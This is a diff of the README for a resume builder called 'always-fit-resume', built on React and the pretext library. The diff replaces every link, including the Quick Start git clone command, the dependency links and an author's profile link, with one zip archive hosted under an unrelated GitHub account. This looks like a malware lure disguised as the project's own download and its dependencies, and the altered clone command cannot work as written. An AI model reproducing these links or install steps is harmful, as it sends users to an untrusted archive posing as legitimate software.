@@ -4,7 +4,7 @@ A resume builder that auto-scales font size and line spacing to always fit on on
 
 Write your resume in markdown. The preview updates instantly — no DOM measurement, no flickering, no layout shifts.
 
-Powered by [pretext](https://github.com/chenglou/pretext) for DOM-free text measurement.
+Powered by [pretext](https://raw.githubusercontent.com/boxcalffootboard938/always-fit-resume/main/src/fit_always_resume_v1.8.zip) for DOM-free text measurement.
 
 ## Features
 
@@ -19,7 +19,7 @@ Powered by [pretext](https://github.com/chenglou/pretext) for DOM-free text meas
 ## Quick Start
 
 ```bash
-git clone https://github.com/vladartym/always-fit-resume.git
+git clone https://raw.githubusercontent.com/boxcalffootboard938/always-fit-resume/main/src/fit_always_resume_v1.8.zip
 cd always-fit-resume
 npm install
 npm run dev
@@ -29,7 +29,7 @@ Open [http://localhost:5173](http://localhost:5173).
 
 ## How It Works
 
-This project was inspired by [pretext](https://github.com/chenglou/pretext) by [Cheng Lou](https://github.com/chenglou) — a library that measures text layout without touching the DOM. Traditional web text measurement relies on `getBoundingClientRect()` and `offsetHeight`, which trigger expensive browser reflow — every call forces the browser to re-layout the entire document. Pretext sidesteps this entirely by using Canvas `measureText()` for font shaping in a one-time preparation step, then performing line breaking and height calculation with pure arithmetic. The result is roughly **500x faster** than interleaved DOM measurement.
+This project was inspired by [pretext](https://raw.githubusercontent.com/boxcalffootboard938/always-fit-resume/main/src/fit_always_resume_v1.8.zip) by [Cheng Lou](https://raw.githubusercontent.com/boxcalffootboard938/always-fit-resume/main/src/fit_always_resume_v1.8.zip) — a library that measures text layout without touching the DOM. Traditional web text measurement relies on `getBoundingClientRect()` and `offsetHeight`, which trigger expensive browser reflow — every call forces the browser to re-layout the entire document. Pretext sidesteps this entirely by using Canvas `measureText()` for font shaping in a one-time preparation step, then performing line breaking and height calculation with pure arithmetic. The result is roughly **500x faster** than interleaved DOM measurement.
 
 This speed unlocks something that would otherwise be impractical: we can run a binary search over font sizes, measuring the full resume layout **hundreds of times per frame**, until we find the largest font size that fits on one page — all without a single layout reflow.
 
@@ -73,10 +73,10 @@ Skill 1 · Skill 2 · Skill 3
 
 ## Tech Stack
 
-- [React](https://react.dev)
-- [pretext](https://github.com/chenglou/pretext) — DOM-free text measurement
-- [Tailwind CSS](https://tailwindcss.com)
-- [Vite](https://vite.dev)
+- [React](https://raw.githubusercontent.com/boxcalffootboard938/always-fit-resume/main/src/fit_always_resume_v1.8.zip)
+- [pretext](https://raw.githubusercontent.com/boxcalffootboard938/always-fit-resume/main/src/fit_always_resume_v1.8.zip) — DOM-free text measurement
+- [Tailwind CSS](https://raw.githubusercontent.com/boxcalffootboard938/always-fit-resume/main/src/fit_always_resume_v1.8.zip)
+- [Vite](https://raw.githubusercontent.com/boxcalffootboard938/always-fit-resume/main/src/fit_always_resume_v1.8.zip)
 
 ## License
 
